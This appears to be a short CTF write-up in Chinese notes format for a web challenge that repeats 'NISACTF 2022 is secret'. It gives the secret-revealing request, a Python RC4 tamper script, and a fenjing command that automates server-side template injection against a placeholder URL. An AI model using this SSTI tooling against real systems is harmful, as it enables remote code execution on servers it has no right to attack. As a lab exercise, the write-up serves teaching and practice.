- # 思路
	- 和[[CTF/WP/NISACTF 2022 is secret]]是同一题
	- {{embed ((64b57451-c669-40ab-98ed-c8de91a1fc2e))}}
- # 获取secret
	- 访问`/secret?secret=114514`
- # SSTI
	- 写一个脚本传给fenjing
		- ```python
		  import sys
		  from Crypto.Cipher import ARC4
		  from urllib.parse import quote, unquote
		  
		  
		  def urlencode(s):
		      if isinstance(s, bytes):
		          return quote("".join(chr(c) for c in s).encode())
		      return quote(s)
		  
		  def urldecode(s):
		      return unquote(s)
		  
		  def rc4_encrypt(key, plaintext):
		      cipher = ARC4.new(key)
		      encrypted_text = cipher.encrypt(plaintext.encode())
		      return urldecode(urlencode(encrypted_text))
		  
		  # 示例使用
		  key = b'HereIsTreasure'  # 密钥，以字节形式表示
		  plaintext = input()  # 明文
		  
		  encrypted_text = rc4_encrypt(key, plaintext)
		  print(encrypted_text, end = "")
		  
		  
		  ```
	- ```shell
	  python -m fenjing crack --url 'http://xxx/secret' --inputs secret --method GET --tamper-cmd 'python a.py'
	  ```
-